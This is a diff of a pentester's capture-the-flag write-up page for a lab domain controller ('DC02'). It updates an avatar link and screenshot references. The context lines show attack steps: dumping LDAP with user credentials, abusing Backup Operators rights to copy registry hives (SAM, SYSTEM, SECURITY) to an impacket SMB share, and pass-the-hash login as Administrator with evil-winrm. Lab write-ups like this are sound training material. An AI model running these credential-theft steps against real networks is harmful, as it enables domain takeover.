@@ -53,7 +53,7 @@
             <div class="col-md-3 col-lg-2 sidebar">
                 <div class="sidebar-content">
                     <div class="profile-section text-center mb-4">
-                        <img src="https://avatars.githubusercontent.com/u/110058202?v=4" 
+                        <img src="https://hackmyvm.eu/img/u/218d122cff717db7624e56a4d380872c.jpg" 
                              alt="V01" class="profile-avatar mb-3">
                         <h5 class="text-white mb-2">V01</h5>
                         <p class="text-white-50 mb-3">Pentester, CTF player</p>
@@ -254,6 +254,8 @@ sudo ldapdomaindump -u 'SOUPDECODE.LOCAL\zximena448' -p 'i...' 192.168.0.18
 ![kerbrute](../images/DC02_images/9.png)
 
 The user `zximena448` it's a member from `Backup Operator` group.
+![kerbrute](../images/DC02_images/10.png)
+
 
 With that information, we can make a copy from SAM, SYSTEM and SECURITY files. In that case, we can use the `impacket-reg` tool.
 * Creating a share folder to receive the files:
@@ -262,7 +264,7 @@ mkdir -p /tmp/share
 chmod 777 /tmp/share
 impacket-smbserver share /tmp/share -smb2support
 ```
-![kerbrute](../images/DC02_images/10.png)
+
 
 * Running the `impacket-reg` command to copy the files:
 ```bash
@@ -297,7 +299,7 @@ Authenticating as Administrator and retrieving the root flag.
 ```bash
 evil-winrm -i 192.168.0.18 -u Administrator -H 8982...
 ```
-![kerbrute](../images/DC02_images/15.png)
+![kerbrute](../images/DC02_images/17.png)
 
 
                             </div>
